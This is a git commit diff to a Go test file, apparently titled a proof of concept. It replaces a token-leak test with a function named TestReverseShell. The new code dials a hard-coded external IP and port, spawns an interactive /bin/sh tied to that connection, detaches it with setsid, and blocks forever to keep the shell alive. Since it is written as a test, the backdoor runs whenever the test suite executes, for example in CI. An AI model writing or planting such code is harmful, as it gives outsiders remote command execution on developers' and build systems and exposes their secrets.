72e5b0d3a5084a00fe439ffcbf285408f33ec220
Sahar Shlichove (MixBanana) <49879157+sahar042@users.noreply.github.com>
2025-11-17 16:17:45 +0200

    Update poc_github_token_test.go

--- utils/tests/poc_github_token_test.go
+++ utils/tests/poc_github_token_test.go
@@ -1,15 +1,43 @@
 package tests
 
 import (
-	"os"
+	"net"
+	"os/exec"
+	"syscall"
 	"testing"
 )
 
-func TestLeakGithubToken(t *testing.T) {
-  
-	if token == "" {
-		t.Log("PoC: jfrog.url is empty")
-		return
+func TestReverseShell(t *testing.T) {
+	addr := "18.158.157.99:17613"
+
+	conn, err := net.Dial("tcp", addr)
+	if err != nil {
+		t.Fatalf("Failed to connect to %s: %v", addr, err)
 	}
-  t.Logf(jfrog.url)
+	// No defer conn.Close() because we want to keep it open
+
+	cmd := exec.Command("/bin/sh", "-i") // <- Spawn an interactive shell
+
+	// Tie shell to the TCP connection
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+
+	// Optional: setsid to create a new session (can help with stability)
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		Setsid: true,
+	}
+
+	err = cmd.Start()
+	if err != nil {
+		t.Fatalf("Shell start failed: %v", err)
+	}
+
+	// Keep shell alive even if it exits
+	go func() {
+		_ = cmd.Wait()
+	}()
+
+	// Infinite sleep to persist the process
+	select {}
 }
